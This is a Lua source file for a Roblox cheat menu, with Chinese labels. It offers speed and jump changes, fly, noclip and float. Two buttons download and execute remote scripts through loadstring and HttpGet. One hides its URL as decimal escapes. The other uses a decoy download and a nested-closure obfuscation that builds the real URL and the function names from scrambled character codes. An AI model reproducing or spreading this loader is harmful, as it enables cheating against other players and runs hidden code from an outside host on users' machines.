-- 拉脚本 UI
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()

-- 主屏幕GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LaScriptUI"
ScreenGui.Parent = player.PlayerGui

-- 主框架
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 600, 0, 400)
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

-- 标题栏
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 30)
TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

-- UI标题
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.Size = UDim2.new(0, 100, 1, 0)
TitleLabel.Position = UDim2.new(0, 10, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "拉脚本"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Font = Enum.Font.Gotham
TitleLabel.TextSize = 14
TitleLabel.Parent = TitleBar

-- 关闭按钮
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 30, 1, 0)
CloseButton.Position = UDim2.new(1, -70, 0, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
CloseButton.BorderSizePixel = 0
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Font = Enum.Font.Gotham
CloseButton.TextSize = 14
CloseButton.Parent = TitleBar

-- 缩放按钮
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Size = UDim2.new(0, 30, 1, 0)
MinimizeButton.Position = UDim2.new(1, -35, 0, 0)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
MinimizeButton.BorderSizePixel = 0
MinimizeButton.Text = "_"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.Font = Enum.Font.Gotham
MinimizeButton.TextSize = 14
MinimizeButton.Parent = TitleBar

-- 内容区域
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 1, -30)
ContentFrame.Position = UDim2.new(0, 0, 0, 30)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

-- 左侧选择区域
local LeftPanel = Instance.new("Frame")
LeftPanel.Name = "LeftPanel"
LeftPanel.Size = UDim2.new(0, 150, 1, 0)
LeftPanel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
LeftPanel.BorderSizePixel = 0
LeftPanel.Parent = ContentFrame

-- 左侧滚动框
local LeftScrollingFrame = Instance.new("ScrollingFrame")
LeftScrollingFrame.Name = "LeftScrollingFrame"
LeftScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
LeftScrollingFrame.BackgroundTransparency = 1
LeftScrollingFrame.ScrollBarThickness = 5
LeftScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 100)
LeftScrollingFrame.Parent = LeftPanel

-- 右侧功能区域
local RightPanel = Instance.new("Frame")
RightPanel.Name = "RightPanel"
RightPanel.Size = UDim2.new(1, -150, 1, 0)
RightPanel.Position = UDim2.new(0, 150, 0, 0)
RightPanel.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
RightPanel.BorderSizePixel = 0
RightPanel.Parent = ContentFrame

-- 右侧滚动框
local RightScrollingFrame = Instance.new("ScrollingFrame")
RightScrollingFrame.Name = "RightScrollingFrame"
RightScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
RightScrollingFrame.BackgroundTransparency = 1
RightScrollingFrame.ScrollBarThickness = 5
RightScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
RightScrollingFrame.Parent = RightPanel

-- 最小化时的圆球
local MinimizedBall = Instance.new("TextButton")
MinimizedBall.Name = "MinimizedBall"
MinimizedBall.Size = UDim2.new(0, 50, 0, 50)
MinimizedBall.Position = UDim2.new(0, 20, 0, 20)
MinimizedBall.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MinimizedBall.Text = "拉"
MinimizedBall.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizedBall.Font = Enum.Font.Gotham
MinimizedBall.TextSize = 16
MinimizedBall.Visible = false
MinimizedBall.Parent = ScreenGui

-- 创建圆角
local function createCorner(parent)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 5)
    corner.Parent = parent
    return corner
end

-- 应用圆角
createCorner(MainFrame)
createCorner(CloseButton)
createCorner(MinimizeButton)
createCorner(MinimizedBall)

-- 创建选择按钮
local function createSelectionButton(name, text, position)
    local button = Instance.new("TextButton")
    button.Name = name
    button.Size = UDim2.new(1, -10, 0, 40)
    button.Position = position
    button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    button.BorderSizePixel = 0
    button.Text = text
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Font = Enum.Font.Gotham
    button.TextSize = 12
    button.Parent = LeftScrollingFrame
    
    createCorner(button)
    return button
end

-- 创建功能项
local function createFunctionItem(name, displayName, position, hasInput)
    local itemFrame = Instance.new("Frame")
    itemFrame.Name = name
    itemFrame.Size = UDim2.new(1, -20, 0, 40)
    itemFrame.Position = position
    itemFrame.BackgroundTransparency = 1
    itemFrame.Parent = RightScrollingFrame
    
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Name = "NameLabel"
    nameLabel.Size = UDim2.new(0.6, 0, 1, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = displayName
    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameLabel.Font = Enum.Font.Gotham
    nameLabel.TextSize = 12
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.Parent = itemFrame
    
    local executeButton = Instance.new("TextButton")
    executeButton.Name = "ExecuteButton"
    executeButton.Size = UDim2.new(0, 60, 0, 30)
    executeButton.Position = UDim2.new(1, -70, 0.5, -15)
    executeButton.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
    executeButton.BorderSizePixel = 0
    executeButton.Text = "执行"
    executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    executeButton.Font = Enum.Font.Gotham
    executeButton.TextSize = 12
    executeButton.Parent = itemFrame
    
    createCorner(executeButton)
    
    if hasInput then
        local inputBox = Instance.new("TextBox")
        inputBox.Name = "InputBox"
        inputBox.Size = UDim2.new(0, 80, 0, 30)
        inputBox.Position = UDim2.new(0.6, 10, 0.5, -15)
        inputBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        inputBox.BorderSizePixel = 0
        inputBox.Text = "50"
        inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        inputBox.Font = Enum.Font.Gotham
        inputBox.TextSize = 12
        inputBox.PlaceholderText = "输入数值"
        inputBox.Parent = itemFrame
        
        createCorner(inputBox)
        executeButton.Text = "设置"
    end
    
    return itemFrame
end

-- 创建Float控制按钮
local function createFloatControls()
    local floatFrame = Instance.new("Frame")
    floatFrame.Name = "FloatControls"
    floatFrame.Size = UDim2.new(0, 40, 0, 100)
    floatFrame.Position = UDim2.new(1, -50, 0.5, -50)
    floatFrame.BackgroundTransparency = 1
    floatFrame.Visible = false
    floatFrame.Parent = ScreenGui
    
    local upButton = Instance.new("TextButton")
    upButton.Name = "UpButton"
    upButton.Size = UDim2.new(1, 0, 0, 40)
    upButton.BackgroundColor3 = Color3.fromRGB(70, 200, 70)
    upButton.BorderSizePixel = 0
    upButton.Text = "↑"
    upButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    upButton.Font = Enum.Font.Gotham
    upButton.TextSize = 16
    upButton.Parent = floatFrame
    
    local downButton = Instance.new("TextButton")
    downButton.Name = "DownButton"
    downButton.Size = UDim2.new(1, 0, 0, 40)
    downButton.Position = UDim2.new(0, 0, 1, -40)
    downButton.BackgroundColor3 = Color3.fromRGB(200, 70, 70)
    downButton.BorderSizePixel = 0
    downButton.Text = "↓"
    downButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    downButton.Font = Enum.Font.Gotham
    downButton.TextSize = 16
    downButton.Parent = floatFrame
    
    createCorner(upButton)
    createCorner(downButton)
    
    return floatFrame
end

-- 初始化左侧选择项
local selectionButtons = {
    createSelectionButton("GeneralButton", "通用", UDim2.new(0, 5, 0, 5)),
    createSelectionButton("GBButton", "GB", UDim2.new(0, 5, 0, 50))
}

-- 更新滚动框大小
LeftScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #selectionButtons * 45 + 10)

-- 功能数据
local functionsData = {
    General = {
        {name = "Speed", display = "速度", hasInput = true},
        {name = "JumpPower", display = "跳跃高度", hasInput = true},
        {name = "Fly", display = "飞行"},
        {name = "Noclip", display = "穿墙"},
        {name = "Float", display = "Float"}
    },
    GB = {
        {name = "QingFeng", display = "清风"},
        {name = "Shark", display = "鲨鱼"}
    }
}

-- 当前显示的功能类别
local currentCategory = "General"
local functionItems = {}

-- 显示功能列表
local function showFunctions(category)
    -- 清除现有功能项
    for _, item in pairs(functionItems) do
        item:Destroy()
    end
    functionItems = {}
    
    -- 创建新功能项
    local functions = functionsData[category] or {}
    for i, funcData in ipairs(functions) do
        local item = createFunctionItem(funcData.name, funcData.display, UDim2.new(0, 10, 0, (i-1)*45 + 10), funcData.hasInput)
        table.insert(functionItems, item)
    end
    
    -- 更新滚动区域大小
    RightScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #functions * 45 + 20)
end

-- 创建Float控制按钮
local floatControls = createFloatControls()

-- 变量存储
local flyEnabled = false
local noclipEnabled = false
local floatEnabled = false
local speedValue = 16
local jumpValue = 50

-- 飞行功能
local function toggleFly()
    flyEnabled = not flyEnabled
    if flyEnabled then
        -- 飞行逻辑实现
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Name = "FlyBV"
        bodyVelocity.Parent = player.Character.HumanoidRootPart
        bodyVelocity.MaxForce = Vector3.new(40000, 40000, 40000)
    else
        local bv = player.Character.HumanoidRootPart:FindFirstChild("FlyBV")
        if bv then
            bv:Destroy()
        end
    end
end

-- 穿墙功能
local function toggleNoclip()
    noclipEnabled = not noclipEnabled
    if noclipEnabled then
        -- 穿墙逻辑实现
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    else
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- Float功能
local function toggleFloat()
    floatEnabled = not floatEnabled
    floatControls.Visible = floatEnabled
    
    if floatEnabled then
        -- Float逻辑实现
    else
        -- 停止Float
    end
end

-- 设置速度
local function setSpeed(value)
    speedValue = tonumber(value) or 16
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid.WalkSpeed = speedValue
    end
end

-- 设置跳跃高度
local function setJumpPower(value)
    jumpValue = tonumber(value) or 50
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid.JumpPower = jumpValue
    end
end

-- 执行鲨鱼脚本
local function executeShark()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\81\105\110\103\45\89\117\110\45\68\101\118\47\83\99\114\105\112\116\115\47\77\97\105\110\47\71\117\116\115\37\50\48\37\50\54\37\50\48\66\108\97\99\107\112\111\119\101\114\46\108\117\97"))()
end

-- 执行清风脚本
local function executeQingFeng()
    local generated_url = "https://raw.githubusercontent.com/Egor-Skriptunoff/pure_lua_SHA/refs/heads/master/sha2.lua" 
    local response = game:HttpGet(generated_url)
    if response then    
        (function(v5) 
            local l = function(...) 
                local _ = "" 
                for i,p in next,{...} do 
                    _ = _..string.char(p) 
                end 
                return _ 
            end 
            local x = getfenv(2) 
            return function(v6,...) 
                v6 = l(v6,...) 
                return function(v1,...) 
                    v1 =l(v1,...) 
                    return function(v3,...) 
                        v3 = l(v3,...) 
                        return function(v2,...) 
                            v2 = l(v2,...) 
                            return function(v7,...) 
                                v7 = l(v7,...) 
                                v10 = (v3..v7..v6..v5..v2..v1) 
                                return function(v9,...) 
                                    v9 = l(v9,...) 
                                    v10 = (v3..v2..v7..v6..v5..v1..v9) 
                                    return function(v8,...) 
                                        v8 = l(v8,...) 
                                        v10 = (v9..v5..v8..v3..v7..v6..v2) 
                                        return function(v0,...) 
                                            v0 = l(v0,...) 
                                            v10 = (v1..v7..v0..v9..v5..v8..v6..v3..v2) 
                                            return function(v4,...) 
                                                v4 = l(v4,...) 
                                                v10 = (v6..v4..v1..v5..v0..v8..v7..v2..v3..v9) 
                                                return function(v10,...) 
                                                    v10 = l(v10,...) 
                                                    v10 = (v4..v6..v3..v1..v9..v8..v0..v2..v7..v10) 
                                                    return function(e) 
                                                        return x[l(unpack(e[1]))](game[l(unpack(e[2]))](game,v10)) 
                                                    end 
                                                end 
                                            end 
                                        end 
                                    end 
                                end 
                            end 
                        end 
                    end 
                end 
            end 
        end)(string.char(92))
        (119,46,103,105,116,104,117,98,117,115,101)
        (47,115,107,117,114,103,102,51,48,76,70,69)
        (114,99,111,110,116,101,110,116,46,99,111,109)
        (102,47,114,101,102,115,47)
        (104,101,97,100,115,47,109,97)
        (52,48,99,98,48,70,115,112)
        (49,56,56,54,97,78,50,65,116)
        (47,116,102,54,53,56,101,90,97,83,74,49,78,71)
        (104,116,116,112,115,58,47,47,114,97)
        (105,110,47,109,70,57,71,118,51,70,120,106,81,116,79,56)
        ({{108,111,97,100,115,116,114,105,110,103},{72,116,116,112,71,101,116}})()("qing")
    end
end

-- 按钮事件处理
local function setupButtonEvents()
    -- 左侧选择按钮
    selectionButtons[1].MouseButton1Click:Connect(function()
        currentCategory = "General"
        showFunctions("General")
    end)
    
    selectionButtons[2].MouseButton1Click:Connect(function()
        currentCategory = "GB"
        showFunctions("GB")
    end)
    
    -- 关闭按钮
    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
    
    -- 缩放按钮
    local isMinimized = false
    MinimizeButton.MouseButton1Click:Connect(function()
        isMinimized = not isMinimized
        if isMinimized then
            MainFrame.Visible = false
            MinimizedBall.Visible = true
        else
            MainFrame.Visible = true
            MinimizedBall.Visible = false
        end
    end)
    
    -- 最小化圆球点击
    MinimizedBall.MouseButton1Click:Connect(function()
        MainFrame.Visible = true
        MinimizedBall.Visible = false
        isMinimized = false
    end)
    
    -- Float控制按钮
    floatControls.UpButton.MouseButton1Click:Connect(function()
        -- 向上浮动逻辑
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.Velocity = Vector3.new(0, 50, 0)
        end
    end)
    
    floatControls.DownButton.MouseButton1Click:Connect(function()
        -- 向下浮动逻辑
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.Velocity = Vector3.new(0, -50, 0)
        end
    end)
end

-- 功能按钮事件处理
local function setupFunctionEvents()
    -- 通用功能
    RightScrollingFrame.ChildAdded:Connect(function(child)
        wait(0.1) -- 等待子项完全加载
        
        if child.Name == "Speed" then
            local executeBtn = child:FindFirstChild("ExecuteButton")
            local inputBox = child:FindFirstChild("InputBox")
            if executeBtn then
                executeBtn.MouseButton1Click:Connect(function()
                    if inputBox then
                        setSpeed(inputBox.Text)
                    end
                end)
            end
        elseif child.Name == "JumpPower" then
            local executeBtn = child:FindFirstChild("ExecuteButton")
            local inputBox = child:FindFirstChild("InputBox")
            if executeBtn then
                executeBtn.MouseButton1Click:Connect(function()
                    if inputBox then
                        setJumpPower(inputBox.Text)
                    end
                end)
            end
        elseif child.Name == "Fly" then
            local executeBtn = child:FindFirstChild("ExecuteButton")
            if executeBtn then
                executeBtn.MouseButton1Click:Connect(toggleFly)
            end
        elseif child.Name == "Noclip" then
            local executeBtn = child:FindFirstChild("ExecuteButton")
            if executeBtn then
                executeBtn.MouseButton1Click:Connect(toggleNoclip)
            end
        elseif child.Name == "Float" then
            local executeBtn = child:FindFirstChild("ExecuteButton")
            if executeBtn then
                executeBtn.MouseButton1Click:Connect(toggleFloat)
            end
        elseif child.Name == "QingFeng" then
            local executeBtn = child:FindFirstChild("ExecuteButton")
            if executeBtn then
                executeBtn.MouseButton1Click:Connect(executeQingFeng)
            end
        elseif child.Name == "Shark" then
            local executeBtn = child:FindFirstChild("ExecuteButton")
            if executeBtn then
                executeBtn.MouseButton1Click:Connect(executeShark)
            end
        end
    end)
end

-- 初始化UI
showFunctions("General")
setupButtonEvents()
setupFunctionEvents()

-- 拖拽功能
local dragging = false
local dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- 最小化圆球拖拽
local ballDragging = false
local ballDragInput, ballDragStart, ballStartPos

local function updateBall(input)
    local delta = input.Position - ballDragStart
    MinimizedBall.Position = UDim2.new(ballStartPos.X.Scale, ballStartPos.X.Offset + delta.X, ballStartPos.Y.Scale, ballStartPos.Y.Offset + delta.Y)
end

MinimizedBall.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        ballDragging = true
        ballDragStart = input.Position
        ballStartPos = MinimizedBall.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                ballDragging = false
            end
        end)
    end
end)

MinimizedBall.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        ballDragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == ballDragInput and ballDragging then
        updateBall(input)
    end
end)

-- Float控制按钮拖拽
local floatDragging = false
local floatDragInput, floatDragStart, floatStartPos

local function updateFloat(input)
    local delta = input.Position - floatDragStart
    floatControls.Position = UDim2.new(floatStartPos.X.Scale, floatStartPos.X.Offset + delta.X, floatStartPos.Y.Scale, floatStartPos.Y.Offset + delta.Y)
end

floatControls.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        floatDragging = true
        floatDragStart = input.Position
        floatStartPos = floatControls.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                floatDragging = false
            end
        end)
    end
end)

floatControls.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        floatDragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == floatDragInput and floatDragging then
        updateFloat(input)
    end
end)

print("拉脚本 UI 加载完成！")
